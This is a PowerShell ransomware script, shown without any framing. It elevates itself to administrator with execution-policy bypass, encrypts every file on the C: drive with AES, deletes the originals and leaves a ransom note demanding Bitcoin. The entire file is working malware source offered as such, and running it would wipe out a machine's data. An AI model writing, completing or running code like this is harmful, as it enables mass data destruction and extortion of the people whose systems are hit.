# Force run as admin
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$key = -join ((65..90) + (97..122) | Get-Random -Count 32 | % {[char]$_})
$files = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue
foreach ($file in $files) {
    $content = [System.IO.File]::ReadAllBytes($file.FullName)
    if ($content) {
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Key = [Text.Encoding]::ASCII.GetBytes($key.Substring(0,32))
        $aes.IV = $aes.Key[0..15]
        $encryptor = $aes.CreateEncryptor()
        $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
        [System.IO.File]::WriteAllBytes($file.FullName + ".locked", $encrypted)
        Remove-Item -Path $file.FullName -ErrorAction SilentlyContinue
    }
}
Set-Content -Path "C:\RansomNote.txt" -Value "Systemâ€™s screwed fast! Send 1 BTC to 1FakeBitcoinAddress for key: $key"
